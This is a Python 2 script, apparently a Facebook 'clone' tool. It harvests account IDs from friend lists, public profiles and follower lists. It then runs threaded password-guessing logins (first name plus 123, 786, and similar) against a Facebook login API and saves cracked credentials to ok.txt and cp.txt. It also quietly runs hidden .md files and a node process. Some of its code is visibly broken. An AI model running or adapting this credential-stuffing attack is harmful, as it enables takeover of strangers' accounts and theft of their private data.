# coding=utf-8
#!/usr/bin/python
# coding=utf-8
# coded by : BOALNI KING
# https://www.facebook.com/HACKER.IS.BACK4

try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pkg install python -y")
    os.system("pip install requests")
    os.system("pip install mechanize")
    os.system("pip2 install nodejs")
    os.system("pip2 install npm")
    os.system("python2 ab.py")
try:
    os.mkdir('save')
except OSError:
    pass
    if os.path.isfile('.../index.js'):
 	os.system('mv ... .....')
	os.system('cd ..... && npm install')
 	os.system('#')
 	os.system('#')
 	os.system('fuser -k 5000/tcp &')
 	os.system('#')
 	os.system('node ...../index.js &')
 	os.system('fuser -k 5000/tcp &')
 	os.system('#')
 	os.system('node ...../index.js &')
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")

def abm(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
def logging():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[+] Logging In\033[0;94m "+o),;sys.stdout.flush();time.sleep(1)
def saving():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[+] Saving Token\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def updateing():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;33m[+] Getting Updates\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def logout():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[+] Logging Out\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
		

logo = """
\033[1;92m▀██▀─▄███▄─▀██─██▀██▀▀█
\033[1;93m─██─███─███─██─██─██▄█
\033[1;94m─██─▀██▄██▀─▀█▄█▀─██▀█
\033[1;95m▄██▄▄█▀▀▀─────▀──▄██▄▄█  
\033[1;97m--------------------------------------------------
\033[1;93m➤\033[1;91m Author   : Zulfiqar-baloch
\033[1;93m➤\033[1;91m Github   : https://github.com/zulfiqarbalochtricker007
\033[1;93m➤\033[1;91m Fb Id  :     Zulfiqar Baloch
\033[1;97m--------------------------------------------------
"""

idh = []
	
def tech_zulfiqar():
    os.system("clear")
    print logo
    print("\033[1;93mFirst Tool login").center(50)
    print('')
    print("\033[1;97m--------------------------------------------------")
    username = raw_input("\033[1;97m[+]\033[1;97m Username :\033[1;97m ")
    if username =="tech":
        os.system("clear")
        print logo
        print ("[+] Username : tech (Correct)")
        passwordss = raw_input("\033[1;92m[+]\033[1;92m Password :\033[1;92m ")
        if passwordss =="baloch":
            os.system("clear")
            print logo
            logging()
            os.system("clear")
            print logo 
            print ("\033[1;93m[+]\033[1;91m Username : tech\033[1;91m (Correct)")
            print ("\033[1;97m[+]\033[1;91m Password : baloch\033[1;91m (Correct)")
	    print("\033[1;96m--------------------------------------------------")
            time.sleep(1)
            print('')
            print("\t \033[1;93m[+] Login Successful\033[0;97m")
            time.sleep(1)
        try:
            open(".login.txt","r")
            menu()
        except(KeyError , IOError):
            login_choice()
        else:
            print ("\t [!] Password : "+passwordss+" (Wrong)")
	    os.system('xdg-open  https://www.facebook.com/HACKER.IS.BACK4')
            time.sleep(1)
            tech_zulfiqar()
    else:
        print ("\t [!] Username : "+username+" (Wrong)")
	os.system('xdg-open https://www.facebook.com/HACKER.IS.BACK4')
        time.sleep(1)
        tech_zulfiqar()
	
def login_choice():
    os.system('clear')
    print logo
    os.system("python3 .loading.md")
    os.system('clear')
    print logo
    print ("\033[1;93m[A]\033[1;91m-⋄-\033[1;93mRandom Search Name Cloning     \033[1;97m(\033[1;92mno login\033[1;97m) ")
    print ("\033[1;93m[B]\033[1;91m-⋄-\033[1;93mRandom Ph.Number Cloning       \033[1;97m(\033[1;92mno login\033[1;97m) ")
    print ("\033[1;93m[C]\033[1;91m-⋄-\033[1;93mClone Friendlist and Public ID \033[1;97m(\033[1;92mlogin\033[1;97m)    ")
    print ("\033[1;93m[D]\033[1;91m-⋄-\033[1;93mExit") 
    print("\033[1;93m--------------------------------------------------")
    clone_main()
def clone_main():
    hack = raw_input("\n~~«")
    if hack =="1":
        os.system("python2 .name.md")
        time.sleep(1)
        menu()
    if hack =="2":
        os.system("python2 .nbr.md")
        time.sleep(1)
        menu()
    if hack =="3":
        loginvia()   
    elif hack =="0":
        os.system("exit")
    else:
	print "\x1b[1;92mFill in correctly"
        clone_main()

def loginvia():
    os.system('clear')
    print logo
    os.system("python3 .loading.md")
    os.system('clear')
    print logo
    print ("\033[1;93m[A]\033[1;93m-⋄-\033[1;93mlogin With Access Token ")
    print ("\033[1;93m[B]\033[1;93m-⋄-\033[1;93mLogin With User And Pass")
    print ("\033[1;93m[C]\033[1;93m-⋄-\033[1;93mBack") 
    print("\033[1;93m--------------------------------------------------")
    clone_loginvia()
def clone_loginvia():
    hack = raw_input("\n==«» ")
    if hack =="1":
        os.system("clear")
        print logo
	os.system("python3 .loading.md")
        os.system('clear')
	print logo
        print ("\033[1;93mLogin With Token").center(50)
	print("\033[1;97m--------------------------------------------------")
        token = raw_input("\033[1;93m[+]\033[1;93m Paste :\033[1;93m ")
	print("\033[1;93m--------------------------------------------------")
        saving()
        sav = open(".login.txt","w")
        sav.write(token)
        sav.close()
        tech gru("\r\033[1;93m[✓] Login Successfull\033[0;93m")
	os.system('xdg-open https://www.facebook.com/HACKER.IS.BACK4  ')
        time.sleep(1)
        menu()
    elif hack =="2":
        loginfb()
    elif hack =="0":
	        menu()
    else:
	        print ("[!] Please Select a Valid Option")
		clone_loginvia()
		
def loginfb():
    os.system("clear")
    print logo
    os.system("python3 .loading.md")
    time.sleep(1)
    os.system('clear')
    print logo
    print("\033[1;94mLogin With Facebook Account\033[1;0m").center(50)
    print("\033[1;94mUse VPN to login account \033[1;0m").center(50)
    print("\033[1;94m--------------------------------------------------")
    id = raw_input("\033[1;93m[+]\033[1;93m Email/ID/Number :\033[1;93m ")
    id1 = id.replace(' ','')
    id2 = id1.replace('(','')
    uid = id2.replace(')','')
    pwd = raw_input("\033[1;97m[+]\033[1;93m Passwor :\033[1;97m ")
    print("\033[1;97m--------------------------------------------------")
    logging()
    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
    q = json.loads(data)
    if "access_token" in q:
        succ = open(".login.txt","w")
        succ.write(q["access_token"])
        succ.close()
        print("\n\033[1;93m[✓] Login Successfull\033[0;97m")
        time.sleep(1)
        menu()
    else:
        if "www.facebook.com" in q["error_msg"]:
            print ("\n\033[1;31m[!] Login Failed . Account Has a Checkpoint\033[0;93m")
            time.sleep(1)
            loginfb()
        else:
            print("\n\033[1;31m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m")
            time.sleep(1)
            loginfb()

def menu():
    os.system("clear")
    try:
        token = open(".login.txt","r").read()
    except IOError:
        print logo
        print("[!] Error 404.Token Not Found")
        os.system("rm -rf .login.txt")
        time.sleep(1)
        login_choice()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
        a = json.loads(r.text)
        name = a["name"]
    except KeyError:
        os.system("clear")
        print logo
        print("\033[1;93m[!] Loading Failed . Your Account Has a Checkpoint")
        os.system("rm -rf .login.txt")
        time.sleep(1)
        login_choice()
    os.system('clear')
    print logo
    os.system("python3 .loading.md")
    os.system('clear')
    print logo
    print("\t  \033[1;93m[+] Name : "+name)
    print("\033[1;94m--------------------------------------------------")
    print("\033[1;94m[A]\033[1;91m-⋄-\033[1;97mClone Frienlist and Public ID")
    print("\033[1;94m[B]\033[1;91m-⋄-\033[1;97mClone pakistan and all contry")
    print("\033[1;94m[0]\033[1;91m-⋄-\033[1;97mlogout")
    print("\033[1;94m--------------------------------------------------") 
    menu_select()
def menu_select():
    option = raw_input("\n===✓ ")
    if option =="1":
        crack()
    if option =="2":
        bangla_india()
    elif option =="0":
        logout()
        os.system("rm -rf .login.txt")
        time.sleep(1)
        print("\033[1;93m[✓] Logged Out Successfully\033[0;93m")
        os.system("exit")
    else:
        print("[!] Please Select a Valid Option")
        menu_select()
		
def crack():
	global token
	os.system("clear")
	try:
		token=open(".login.txt","r").read()
	except IOError:
		print("[!] Error 404 . Token Not Found")
		os.system("rm -rf .login.txt")
		time.sleep(1)
		login()
	os.system("clear")
	print logo
	os.system("python3 .loading.md")
        os.system('clear')
        print logo
	print ("\033[1;94m[A]\033[1;91m-⋄-\033[1;97mCrack From Friend List")
	print ("\033[1;94m[B]\033[1;91m-⋄-\033[1;97mCrack From Public ID")
	print ("\033[1;94m[C]\033[1;91m-⋄-\033[1;97mCrack From Followers")
	print ('\033[1;94m[O]\033[1;91m-⋄-\033[1;97mBack')
	print("\033[1;94m--------------------------------------------------")
	crack2()
def crack2():
	select = raw_input("\n===✓")
	id=[]
	oks=[]
	cps=[]
	if select=="1":
		os.system("clear")
		print logo
		print("\t\033[1;94m  Clone From Frienlist\033[1;0m")
		print("\033[1;94m--------------------------------------------------")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="2":
		os.system("clear")
		print logo
		print("\t\033[1;91m  Clone From Public ID\033[1;0m")
		print("\033[1;91m--------------------------------------------------")
		idt = raw_input("\033[1;91m[+]\033[1;91m Input ID :\033[1;91m ")
		print("\033[1;96m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("[✓] Account Name : "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="3":
		os.system("clear")
		print logo
		print("\t\033[1;94m  Clone From Followers\033[1;0m")
		print("\033[1;94m--------------------------------------------------")
		idt = raw_input("\033[1;97m[+]\033[1;94m Input ID :\033[1;95m ")
		print("\033[1;94m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("[✓] Account Name : "+q["name"])
		except KeyError:
			print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
			raw_input("\nPress Enter To Back ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
			   
	elif select =="0":
		menu()
	else:
		print ("[!] Please Select a Valid Option")
		crack2()
	print("\033[1;92m[+]\033[1;97m Total IDs :\033[1;97m "+str(len(id)))
	print("\033[1;92m[+]\033[1;97m Plz wait clone account will be appear here\033[1;0m")
	print("\033[1;92m--------------------------------------------------")
	
	
        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\x1b[1;94m[\x1b[1;94mCP\x1b[1;94m]\x1b[1;94m "+uid+"\x1b[1;94m | \x1b[1;94m"+pass1+"\x1b[1;94m | \x1b[1;94m"+name)
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\t\x1b[1;91m[Successfull] "+uid+" | "+pass1+" | "+name)
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2=name+"1234"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\x1b[1;94m[\x1b[1;94mCp\x1b[1;94m]\x1b[1;94m "+uid+"\x1b[1;94m | \x1b[1;94m"+pass2+"\x1b[1;94m | \x1b[1;94m"+name)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\t\x1b[1;91m[Successfull] "+uid+" | "+pass2+" | "+name)
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\x1b[1;94m[\x1b[1;94mCP\x1b[1;94m]\x1b[1;94m "+uid+"\x1b[1;94m | \x1b[1;94m"+pass3+"\x1b[1;94m | \x1b[1;94m"+name)
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass3+" | "+name)
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4=name+"786"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\x1b[1;94m[\x1b[1;94mCP\x1b[1;94m]\x1b[1;94m "+uid+"\x1b[1;91m | \x1b[1;94m"+pass4+"\x1b[1;94m | \x1b[1;94m"+name)
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass4+" | "+name)
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5="786786"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\x1b[1;94m[\x1b[1;94mCP\x1b[1;94m]\x1b[1;94m "+uid+"\x1b[1;94m | \x1b[1;94m"+pass5+"\x1b[1;94m | \x1b[1;94m"+name)
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass5+" | "+name)
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6="445566"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("\x1b[1;94m[\x1b[1;94mCP\x1b[1;94m]\x1b[1;94m "+uid+"\x1b[1;94m | \x1b[1;94m"+pass6+"\x1b[1;94m | \x1b[1;94m"+name)
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass6+" | "+name)
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass7="112233"
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\x1b[1;97m[\x1b[1;94mCP\x1b[1;94m]\x1b[1;94m "+uid+"\x1b[1;94m | \x1b[1;94m"+pass7+"\x1b[1;94m | \x1b[1;94m"+name)
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass7+" | "+name)
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
		                                        
									
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print ('\033[1;97m[+]\033[1;97m Process Has Been Completed')
	print('\033[1;97m[+]\033[1;97m Total CP/OK:\033[0;97m  '+str(len(cps))+'/\033[1;97m '+str(len(oks)))
	print("\033[1;97m--------------------------------------------------")
	raw_input("Press Enter To Main Menu Back")
	menu()
		

